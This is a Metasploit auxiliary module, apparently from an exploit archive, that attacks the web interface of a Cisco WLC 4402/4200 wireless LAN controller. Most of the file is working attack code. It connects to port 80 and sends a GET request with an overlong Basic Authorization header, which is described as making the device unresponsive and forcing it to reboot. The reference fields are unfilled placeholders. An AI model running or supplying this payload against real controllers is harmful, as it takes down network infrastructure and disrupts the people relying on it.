Cisco WLC 4402 Basic Auth Remote Denial of Service (meta)
=========================================================


require &#039;msf/core&#039;


class Metasploit3 < Msf::Auxiliary

        include Msf::Exploit::Remote::Tcp
        include Msf::Auxiliary::Dos

        def initialize(info = {})
                super(update_info(info,
                        &#039;Name&#039;           => &#039;Cisco WLC 4200 Basic Auth Denial of Service&#039;,
                        &#039;Description&#039;    => %q{

                                This module triggers a Denial of Service condition in the Cisco WLC 4200
                                HTTP server. By sending a GET request with long authentication data, the
                                device becomes unresponsive and reboots.  Firmware is reportedly vulnerable.
                        },
                        &#039;Author&#039;                => [ &#039;Christoph Bott <msf[at]bott.syss.de>&#039; ],
                        &#039;License&#039;        => MSF_LICENSE,
                        &#039;Version&#039;        => &#039;$Revision: 5949 $&#039;,
                        &#039;References&#039;     =>
                                [
                                        [ &#039;BID&#039;, &#039;???&#039;],
                                        [ &#039;CVE&#039;, &#039;???&#039;],
                                        [ &#039;URL&#039;, &#039;http://www.cisco.com/?????&#039;],
                                ],
                        &#039;DisclosureDate&#039; => &#039;January 26 2009&#039;))

                register_options(
                        [
                                Opt::RPORT(80),
                        ], self.class)

        end

        def run
                connect

                print_status("Sending HTTP DoS packet")

                sploit =
                        "GET /screens/frameset.html HTTP/1.0\r\n" +
                        "Authorization: Basic MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDoxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0"

                sock.put(sploit + "\r\n")

                disconnect
        end

end




